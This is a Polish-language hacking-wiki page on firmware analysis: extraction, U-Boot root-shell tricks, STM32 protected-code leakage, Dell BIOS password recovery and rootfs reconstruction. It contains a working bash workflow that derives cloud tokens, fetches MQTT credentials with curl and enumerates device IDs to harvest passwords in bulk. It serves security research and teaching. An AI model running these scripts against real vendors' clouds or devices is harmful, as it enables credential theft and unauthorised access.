# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

Informacje o pozyskiwaniu danych z odsłoniętych interfejsów sprzętowych znajdziesz w artykułach [Zrzut firmware z użyciem konsoli UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [Zrzut pamięci flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Informacje o powtarzalnym przechwytywaniu danych UART podczas uruchamiania, zanim dostępna będzie konsola, znajdziesz w artykule [Pozyskiwanie danych sterowane przez SCPI z zasilania i oscyloskopu](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownik ma kontakt. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie może odczytywać niezbędne instrukcje już od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware i jego ewentualna modyfikacja to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy etap pozwalający zrozumieć budowę urządzenia i wykorzystywane przez nie technologie. Proces ten obejmuje gromadzenie danych dotyczących:

- Architektury CPU i uruchamianego systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i kart katalogowych
- Metryk bazy kodu i lokalizacji źródeł
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open source za pomocą ręcznych i automatycznych metod przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [LGTM firmy Semmle](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od twórców lub producentów)
- **Budując** je zgodnie z udostępnionymi instrukcjami
- **Pobierając** z oficjalnych stron pomocy technicznej
- Korzystając z zapytań **Google dork**, by znaleźć udostępnione pliki firmware
- Uzyskując bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Wyodrębniając** firmware z urządzenia przez połączenia takie jak **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zakodowane na stałe endpointy aktualizacji**
- **Zrzucając** dane z bootloadera lub przez sieć
- W ostateczności **wymontowując i odczytując** układ pamięci za pomocą odpowiednich narzędzi sprzętowych

### Logi dostępne tylko przez UART: wymuszenie powłoki root za pomocą zmiennych środowiskowych U-Boot w pamięci flash

Jeśli dane UART RX są ignorowane (dostępne są tylko logi), nadal można wymusić uruchomienie powłoki init, **edytując offline blob zmiennych środowiskowych U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć pamięć flash SPI za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję env U-Boot, zmień `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla bloba.
3. Zapisz ponownie tylko partycję env i uruchom urządzenie ponownie; na UART powinien pojawić się shell.

Jest to przydatne w urządzeniach wbudowanych, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać za pomocą zewnętrznego dostępu do pamięci flash.

### Ujawnianie chronionego kodu przez zadanie kopiowania Firewall

Niektóre MCU pozwalają niechronionemu kodowi aplikacji wywołać bramę do chronionego obszaru zamiast bezpośrednio odczytywać chronioną pamięć Flash. Po uzyskaniu możliwości wykonywania kodu aplikacji sprawdź każde zadanie bramy jako osobny mechanizm transferu pamięci. W przypadku Cypherock X1 brama Firewall STM32L4 przyjmowała zadanie, zewnętrzny wskaźnik `data`, długość i chroniony `address`. Zadanie zapisu nie odrzucało wskaźnika źródłowego `data` wskazującego na kod Firewall. Wywołujący nie mógł bezpośrednio odczytać tego kodu, ale sama brama mogła skopiować go do chronionej pamięci nieulotnej, z której zadanie odczytu udostępniało go do odczytu.<sup>[[15]](#references)</sup>

Aby odtworzyć ten rodzaj ujawnienia, znajdź zapisywalną stronę chronionej pamięci z odpowiadającym jej zadaniem odczytu, ustaw źródło zapisu na kolejne adresy chronionego kodu i odczytaj z powrotem zapisane bajty. Zanim powtórzysz zapis, sprawdź nośnik danych: w tym przypadku była to pamięć Flash, więc przed ponownym użyciem stronę trzeba było skasować. Badacze użyli procedury, która kasowała i przywracała poprawną zawartość Secure Data Storage, a następnie zapisywali kod w pozostałym wolnym miejscu, zamiast nadpisywać dane portfela. Wymaga to możliwości wykonywania kodu na MCU i dostępnej bramy; nie jest to bezpośrednie obejście odczytu z nieuwierzytelnionego hosta.<sup>[[15]](#references)</sup>

Odzyskany kod może ujawnić [luki w zaufaniu do aktualizacji firmware’u i integralności rozruchu](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Analyzing the firmware

Skoro **masz już firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak go analizować. Możesz w tym celu użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi niewiele znajdziesz, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>` — niska entropia oznacza, że obraz raczej nie jest zaszyfrowany. Wysoka entropia oznacza, że prawdopodobnie jest zaszyfrowany (lub skompresowany w jakiś sposób).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([kod](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Surowe zasoby wyświetlacza w zewnętrznej pamięci flash

Zrzut zewnętrznej pamięci SPI nie musi zawierać wykonywalnego firmware układu MCU. W przypadku celu Cortex-M porównaj początek każdego potencjalnego obszaru kodu z mapą pamięci urządzenia: prawidłowa tablica wektorów zaczyna się od wiarygodnego wskaźnika stosu SRAM i adresu procedury obsługi resetu w pamięci wykonywalnej. Brak tablicy wektorów pod offsetem zero sam w sobie nie dowodzi, że cały układ nie zawiera kodu; sprawdź inne offsety i sposób uruchamiania. Jeśli `binwalk` nie wykrywa żadnego kontenera, sprawdź surowe bajty i skoreluj adresy odczytu pamięci flash z [zdekodowanym przechwyceniem SPI](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) z czynnościami powodującymi załadowanie nowych ekranów.<sup>[[14]](#references)</sup>

W przypadku obszaru zawierającego zasoby wyświetlacza przetestuj różne formaty pikseli i wymiary, zamiast zakładać, że są to pliki PNG/JPEG. W opisywanym urządzeniu użyto klatek **80×160 RGB565 little-endian**: przy dwóch bajtach na piksel klatka ma **25 600 bajtów** (25 KiB), a nie 24 kilobity. Zdekodowany adres odczytu pamięci flash pozwolił ustalić offset zasobu ekranu; badacz przekonwertował przygotowany obraz poleceniem `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zastąpił zasób o tej samej długości w oryginalnym zrzucie, zapisał go poleceniem `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potwierdził wyświetlenie nowego obrazu. Pokazuje to, że można zapisywać *zewnętrzne zasoby wyświetlacza*, a nie wyodrębniać ani przeprogramowywać wewnętrzny firmware MCU. Zachowaj oryginalny zrzut i przed zapisem zweryfikuj wymiary, kolejność bajtów, offset oraz długość zastępowanych danych.<sup>[[14]](#references)</sup>

### Analiza różnic w pamięci flash i odzyskiwalne magazyny sekretów XOR

Jeśli format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka odczytów pamięci flash w tych samych warunkach, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj całą zawartość układu i porównaj offsety. Powtórzenie eksperymentu z kontrolowanymi wartościami pozwala odróżnić ustawienie od liczników i metadanych zapisu; zmiany pod nowymi offsetami, zamiast w miejscu, wskazują na magazyn tylko do dopisywania lub o strukturze dziennika. Zachowaj usunięte wpisy i wpisy oznaczone jako nieaktywne — ich bajty danych mogą nadal nadawać się do odzyskania.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware za pomocą narzędzi takich jak `binwalk` i przeanalizuj w Ghidra kod zapisujący i walidujący dane. Potwierdź w kodzie granice pól, padding, indeksowanie klucza i sposób wyprowadzania klucza, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców szyfrogramu.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego paddingu zerowego

Jak opisano w sekcji [szyfrowania opartego na XOR](../../crypto/symmetric/#xor-based-encryption), znany tekst jawny ujawnia bajty strumienia klucza na tych samych pozycjach. Pole o stałym rozmiarze jest szczególnie podatne, gdy jego padding zerowy obejmuje wszystkie indeksy powtarzającego się klucza XOR: zaszyfrowany padding bezpośrednio ujawnia te bajty klucza, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli pokryty jest każdy indeks klucza, odtwórz klucz z końcówki szyfrogramu i odszyfruj wypełnione bajty.<sup>[[12]](#references)</sup>

Podatny format hasła BIOS DVAR firmy Dell to konkretny przykład: bajt `0` pola o długości 32 bajtów jest zapisany jawnie, a bajty `1..31` są szyfrowane za pomocą powtarzającego się klucza o długości 20 bajtów.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały wartość zero przed operacją XOR. Gdy `L <= 12`, pozycje te obejmują każdy indeks klucza, więc cały klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Odzyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest wyprowadzany w przybliżeniu jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jego pierwszy jawny bajt. Daje to najwyżej 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Pogrupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może ujawnić pełny klucz dzięki paddingowi i odszyfrować obecny, dłuższy rekord, którego własny padding nie wystarcza. Rotacja hasła może więc zwiększyć ekspozycję, jeśli stary szyfrogram jest oznaczany jako usunięty, zamiast zostać skasowany.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje kandydatów na rekordy, odzyskuje hasła i może wyświetlać surowe bajty przechowywanych danych i klucza. Zbuduj je z pobranego repozytorium i przeskanuj zweryfikowany obraz flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku niestandardowych parserów odrzucaj fałszywe wyniki, sprawdzając strukturę rekordów, ograniczenia dotyczące drukowalnych znaków, dopełnienie zerami, entropię klucza oraz spójność w miejscu zawijania klucza. Jeśli powtarzane zrzuty pokazują nieliczne zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj poprawki według tych ograniczeń, ale zgłaszaj niejednoznaczne znaki zamiast przedstawiać wynik heurystyczny jako dokładne odzyskanie danych.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany jednokierunkowy hash zamiast odwracalnego szyfrogramu, a magazyny o strukturze dziennika powinny bezpiecznie usuwać zastąpione dane tajne.<sup>[[12]](#references)</sup>

### Pozyskiwanie systemu plików

Korzystając z wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinieneś móc **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu o nazwie odpowiadającej typowi systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtu magicznego systemu plików wśród swoich sygnatur**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnić** system plików zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom poniższe **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- W przypadku squashfs (użytego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- W przypadku systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- W przypadku systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych głównych systemów plików urządzeń wbudowanych

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie uznawaj go od razu za uszkodzony. Kod rozruchowy urządzenia wbudowanego może złożyć rzeczywiste urządzenie główne z wielu zakresów fizycznych przy użyciu Device Mapper, więc wyodrębnienie danych z jednej partycji GPT daje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza pełnego obrazu nośnika

Najpierw sprawdź, czy pozyskiwanie danych zostało zakończone, rozmiar obrazu jest stabilny i żaden proces zapisu nadal nie ma go otwartego. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odzyskaj GPT w trybie tylko do odczytu i podłącz tylko wymagany zakres; **nie** uruchamiaj `vgchange -ay` na niezaufanym woluminie fizycznym na stacji roboczej, ponieważ może dojść do konfliktów grup woluminów i niezamierzonych zapisów.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferuj tymczasową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi widzieć cały obraz. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zapisać offsety w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić wbudowaną linię poleceń, kernel i initramfs, a następnie niezależnie zweryfikuj każdy plik za pomocą `file`, bajtów magicznych i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć do kernela initrd, obiekt ACPI lub podpis.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków podczas rozruchu

Wyodrębnij initramfs kernela i przeanalizuj wstecz `/init` oraz wszelkie biblioteki pamięci masowej. W [Narzędzia do inżynierii wstecznej i podstawowe metody](../../reversing/reversing-tools-basic-methods/) prześledź odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji; następnie prześledź kod wybierający aktywny slot A/B i tworzący tablicę. Przydatne punkty początkowe w radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel liniowy mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń bazowych. Odzyskana tablica złożona z dwóch segmentów często ma następującą postać (wszystkie pozycje i długości podano w sektorach po 512 bajtów):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz dokładnie operacje arytmetyczne z kodu maszynowego, w tym szerokość liczb całkowitych, przesunięcia i przeliczenia jednostek. Na przykład poniższe wyrażenie zaokrągla rozmiar w bajtach w dół do granicy 4 KiB i dopiero potem przelicza go na sektory po 512 bajtów; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany koniec o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do granicy strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz analityczny, kopiując zakresy w kolejności z tabeli, w ograniczonych fragmentach, zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mappera po stronie hosta. Zachowaj offsety wyznaczone na podstawie GPT, odwrócone liczby sektorów i wynikową długość pliku wyjściowego jako osobne asercje.<sup>[[9]](#references)</sup>

#### Odróżnianie uszkodzenia od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź magiczną wartość `hsqs` i zdekoduj 64-bitowe pole `bytes_used` w formacie little-endian, znajdujące się pod offsetem 40 w superbloku, zanim uruchomisz `unsquashfs`. Jeśli ekstrakcja nie powiedzie się w kilku niezwiązanych ze sobą strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj mocnych kandydatów strukturalnych: bloku metadanych, który da się zdekompresować, kilku kolejnych prawidłowych wpisów katalogu, prawdopodobnych pól i-węzła, i-węzła głównego zgodnego z liczbą i-węzłów albo prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie magicznej wartości nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama delta ze znakiem sprawia, że niezależne struktury stają się poprawne — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd w początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i poszukaj odrzuconych reszt z dzielenia, problemów z interpretacją znaku, przepełnienia lub zaokrągleń do granic sektorów lub stron, zanim spróbujesz odzyskiwać osierocone dane lub poprawiać metadane systemu plików.<sup>[[9]](#references)</sup>

Na koniec rozdziel granice ochrony: woluminy LUKS z kluczami zabezpieczonymi przez TPM chronią poufność danych, natomiast podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie odzyska klucza zabezpieczonego za pomocą oryginalnego fizycznego TPM, a uruchomienie zmodyfikowanego SquashFS przez init przeznaczony wyłącznie do badań, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware

Po uzyskaniu firmware należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i ekstrakcji wartościowych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej podano zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają określić typ pliku, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz poznać szczegóły dotyczące partycji i systemów plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, a wysoka może wskazywać na szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zaleca się narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu o nazwie odpowiadającej jego typowi (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów magicznych, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do znalezienia przesunięcia systemu plików, a następnie polecenia `dd` do wyodrębnienia go:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików można rozpocząć poszukiwanie luk w zabezpieczeniach. Należy zwrócić uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, punkty końcowe API, funkcje serwerów aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia:

- **etc/shadow** i **etc/passwd** pod kątem danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk w zabezpieczeniach
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

W wykrywaniu poufnych informacji i luk w systemie plików pomagają następujące narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware'u
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Kod źródłowy i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk w zabezpieczeniach. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych na podstawie danych

Wiele hubów IoT pobiera konfigurację dla poszczególnych urządzeń z punktu końcowego w chmurze o takim formacie:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware'u można odkryć, że `<token>` jest lokalnie wyliczany na podstawie identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i zapisany jako wielkie litery w zapisie szesnastkowym

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację z chmury, często ujawniając dane uwierzytelniające MQTT zapisane jawnym tekstem oraz prefiksy tematów.

Praktyczny przebieg pracy:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3,3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Szukaj wierszy wypisujących wzorzec URL konfiguracji chmury oraz adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyznacz token w Bashu i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Pozyskaj konfigurację chmury i poświadczenia MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go za pomocą jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystanie MQTT przesyłającego dane jawnym tekstem i słabych ACL-i topiców (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby zasubskrybować topics związane z konserwacją i szukać wrażliwych zdarzeń:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów umieszcza bajty OUI producenta/produktu/typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po potencjalnych identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notatki
- Zawsze uzyskaj wyraźną zgodę przed podjęciem próby masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego sprzętu.


Proces emulacji firmware’u umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotkać trudności związane z zależnościami od sprzętu lub architektury, ale przeniesienie systemu plików root albo określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub na gotową maszynę wirtualną może ułatwić dalsze testowanie.

### Emulowanie pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest ustalenie kolejności bajtów i architektury procesora programu.

#### Przykład architektury MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

A także, aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Dla MIPS (big-endian) używa się `qemu-mips`, a w przypadku binariów little-endian należy wybrać `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny: do emulacji używa się emulatora `qemu-arm`.

### Emulacja całego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają emulację całego firmware'u, automatyzując ten proces i wspomagając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych głównych systemów plików na potrzeby emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia tabel i-węzłów, katalogów lub fragmentów są niemożliwe do uzyskania, nie modyfikuj od razu `unsquashfs`. Przeprowadź inżynierię wsteczną wczesnego pliku binarnego rozruchu i odtwórz graf urządzeń blokowych, który tworzy: systemy wbudowane mogą udostępniać nominalną partycję główną, ale tworzyć rzeczywisty system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Kontrole obejmujące tylko superblok mogą zakończyć się powodzeniem, mimo że wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[11]](#references)</sup>

